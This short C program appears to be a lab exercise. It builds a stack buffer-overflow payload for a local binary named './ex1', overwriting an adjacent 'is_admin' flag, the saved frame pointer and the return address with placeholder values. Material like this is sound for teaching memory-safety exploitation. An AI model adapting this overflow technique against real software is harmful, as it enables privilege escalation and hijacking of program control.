#include <unistd.h>
 #include <stdlib.h>
 #include <stdint.h>
 #include <string.h>

 struct {
   char buf[32];
   int is_admin;
   char padding[8];
   uint32_t saved_ebp;
   uint32_t return_addr;
   char null;
 } payload;

 int main (int argc, char *argv[]) {
   // Fill payload with A's
   memset(&payload, 'A', sizeof(payload));
   // Null terminate the string
   payload.null = 0;

   payload.saved_ebp = 0x42424242;
   payload.return_addr = 0x41414141;

   char *const exec_argv[] = {
     "./ex1",
     (char*)&payload,
     NULL
   };

   execv(exec_argv[0], exec_argv);
   return EXIT_SUCCESS;
}